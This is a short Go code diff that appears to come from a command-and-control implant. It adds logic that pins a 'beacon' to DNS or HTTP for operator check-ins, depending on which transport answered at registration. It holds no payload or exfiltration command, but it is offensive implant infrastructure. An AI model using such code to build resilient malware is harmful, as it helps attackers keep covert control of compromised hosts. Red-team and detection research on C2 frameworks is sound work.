@@ -71,6 +71,11 @@ type transportManager struct {
 	// dnsWeight and httpWeight bias the dual-mode class choice for check-ins.
 	dnsWeight  int
 	httpWeight int
+
+	// latched records that a dual beacon gave up on one transport at
+	// registration and is now pinned to the working one. The operator can
+	// re-enable the other side via a runtime transport/domain update.
+	latched bool
 }
 
 // newTransportManager resolves configuration into a live transport manager.
@@ -152,6 +157,48 @@ func (m *transportManager) ShouldUseHTTP() bool {
 	default:
 		return false
 	}
+}
+
+// dualModeFromProbes turns the registration probes into the mode the beacon
+// should run in. Both transports answering keeps dual; one answering means the
+// beacon latches to that class (the failed side is retried by the caller before
+// this is consulted); neither answering keeps DNS as the best-effort default.
+func dualModeFromProbes(dnsOK, httpOK bool) string {
+	switch {
+	case dnsOK && httpOK:
+		return transportDual
+	case dnsOK:
+		return transportDNS
+	case httpOK:
+		return transportHTTP
+	default:
+		return transportDNS
+	}
+}
+
+// LatchTo pins a dual beacon to a single class after a registration probe found
+// the other transport dead. It is a no-op for "dual": latching only ever
+// narrows to one working transport.
+func (m *transportManager) LatchTo(mode string) {
+	mode = normalizeTransportMode(mode)
+	if mode == transportDual {
+		return
+	}
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	m.mode = mode
+	m.latched = true
+	m.probing = false
+	m.failures = 0
+	m.lastErr = nil
+}
+
+// Latched reports whether a dual beacon was pinned to one transport at
+// registration.
+func (m *transportManager) Latched() bool {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	return m.latched
 }
 
 // SelectEndpoint chooses the single endpoint the next check-in is sent to, in
